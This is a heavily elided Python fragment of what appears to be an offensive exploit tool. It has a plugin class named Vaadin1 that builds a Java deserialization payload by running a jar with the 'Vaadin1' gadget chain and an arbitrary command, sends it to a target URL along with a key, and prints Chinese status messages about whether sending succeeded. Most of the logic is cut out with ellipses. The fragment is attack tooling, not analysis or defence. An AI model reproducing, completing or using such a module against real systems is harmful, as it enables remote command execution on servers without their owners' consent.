...
@Idea.plugin_register('Class28:Vaadin1')
class Vaadin1(object):
    ...
    def sendPayload(self,url,command,resKey,fp=JAR_FILE):
        ...
        popen = subprocess.Popen(['java', '-jar', fp, 'Vaadin1', command],       #popen
        ...
        try:
            ...
            if(x.status_code==200):
                ...
                print("[+]   ****Vaadin1模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(x.status_code)))
            else:
                print("[-]   ****Vaadin1模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(x.status_code)))
